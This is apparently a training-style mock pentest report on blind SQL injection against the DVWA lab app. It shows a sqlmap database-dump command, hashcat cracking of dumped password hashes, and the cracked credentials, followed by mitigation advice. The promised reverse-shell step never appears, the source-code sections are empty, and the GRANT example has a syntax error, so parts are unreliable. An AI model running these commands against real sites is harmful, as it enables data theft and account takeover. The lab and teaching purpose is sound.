# Blind SQL Injection Remote Code Execution Report


## Table of Contents
- [**Outline**](#section-0)
- [**Vulnerability Explanation**](#section-1)
- [ **Proof of Concept - Establishing a  Reverse Shell**](#section-2)
- [ **Source Code Analysis**](#section-3)
- [**Mitigating Blind SQL Injection Vulnerability**](#section-4)

## Outline {#section-0}
The goal of this write-up is to document and demonstrate Blind SQL Injection vulnerability against the DVWA application. The objective of this attack was to gain a Remote Code Execution (RCE) as `www-data`. This report mocks a penetration testing report and a debriefing situation for a client. 

## Vulnerability Explanation {#section-1}

| Information | Explanation                            |
|-------------|----------------------------------------|
| Name        | SQLi                                   |
| Severity    | High                                   |
| CVSS        | 8.8                                    |
| String      | AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H    |
| Path        | http://127.0.0.1/vulnerabilities/sqli/ |


SQL injection is a security vulnerability that allows attackers to manipulate SQL queries executed by a web application's database.  

![](/assets/sqlb/map.png)   
In addition, Blind SQL injection is a type of SQL injection vulnerability, however, the HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.  

![](/assets/sqlb/map2.png)   

This vulnerability poses a significant threat to the Confidentiality, Integrity, and Availability (CIA) triad of a system, as it can result in data breaches, unauthorized data disclosure, data manipulation,  and potential system downtime. It may also lead to a full compromise of a system through Remote Code Execution. 


## Proof of Concept {#section-2}
### Automating the Process SQLMap 

To exploit the vulnerability, the tester utilized SQLMap.  SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities in web applications. As such, SQLMap automatically identifies vulnerable parameters and SQL injection techniques to use depending on the Database Management System (DBSM).

The tester first intercepted the SQL query with Burp Suite and fed SQLmap with the intercepted data. This  captured  request file was named `hack`
![](/assets/sqlb/intercept.png)   


```bash
echo 'GET /vulnerabilities/sqli_blind/?id=2&Submit=Submit HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit
Cookie: PHPSESSID=dse3mdg76nb5nbp3sg3md8g651; security=low
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1' > hack

``` 
Next the tester ran SQLmap with the `--dump` parameter  to exploit a SQL injection vulnerability in a web application. The `--dump` option extracts and retrieves the contents of the database,  revealing sensitive data stored within the data base.

```bash
sqlmap -r hack  --dump
```
![](/assets/sqlb/result.gif)   


Next, the tester extracted the saved data base password using hashcat.
 ```bash
 hashcat -a 0 -m 0  /tmp/sqlmapsioqi_7q979443/sqlmaphashes-v4n117tp.txt /usr/share/wordlists/rockyou.txt --show
 ```
The tester was able to retrieve the passwords for all the users with ease.
```bash
8d3533d75ae2c3966d7e0d4fcc69216b:charley
5f4dcc3b5aa765d61d8327deb882cf99:password
e99a18c428cb38d5f260853678922e03:abc123
0d107d09f5bbe40cade3de5c71e9e9b7:letmein

```


## Source Code Analysis {#section-3}
### Security-Low-Level
```bash

```


### Security-High-Level
```php

```



## Mitigating SQL Injection Vulnerability {#section-4}  
### Use Parameterized Queries
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->bindParam(':username', $username);
$stmt->bindParam(':password', $password);
$stmt->execute();
```
 Bind  input values from the SQL code and ensures that they are treated as data rather than executable SQL statements. When a value is binded, it is securely passed to the database engine as a parameter, and the databasee interpreted the parameter as non sql data to be used in the query. Here the `:username` and `:password` are binded to the parameter `$username` and `$password` respectively.

### Principle of Least Privilege

Ensure that database users have the minimum required privileges necessary for their operations. Avoid granting excessive permissions to user accounts.
```bash
mysql -u root -p root
GRANT SELECT, INSERT, UPDATE, DELETE, ON mydatabase.* TO 'app'@'localhost';
FLUSH PRIVILEGES;
```
By excluding the `EXECUTE` privilege, the system restrict the user from executing stored procedures . Moreover, by removing the `INTO OUTFILE`, the system prevents users from writing query results directly to an output file on the server's file system. This would have prevented the Remote Code Execution demonstrated in the start of the report.

### Password Hashing: 
Use strong cryptographic hash functions with salt. Modern hashing algorithms such as Argon2id, bcrypt, and PBKDF2 automatically incorporate salt and are considered the standards when hashing passwords. A salt is a unique and randomly generated string that is added to each password during the hashing process. Since the salt is unique for every user, an attacker must crack hashes one at a time using the corresponding salt, rather than calculating a hash once and comparing it against every stored hash. This provides an additional layer of security for storing passwords. 
Below is an example code snippet in Python using the popular bcrypt library to hash and salt the password.
```bash
import bcrypt

# Generate a salt and hash the password
password = b"MyPassword123"  # Note the 'b' prefix to indicate a byte string
hashed_password = bcrypt.hashpw(password, bcrypt.gensalt())

# Print the hashed password
print(hashed_password)

```


## Conclusion
In conclusion, SQL injection is a critical vulnerability that poses significant risks to the security and integrity of database. It enables attackers to manipulate SQL queries and potentially gain unauthorized access, disclose sensitive information, or even execute arbitrary code. Preventing SQL injection is of prime importance to protect the confidentiality, integrity, and availability of data for users.

### Reference: 
[GrootBoan](https://security.grootboan.com/) , [SECN](https://secnhack.in/take-meterpreter-of-website-using-sqlmap-os-shell/) &
[Portswigger](https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection) 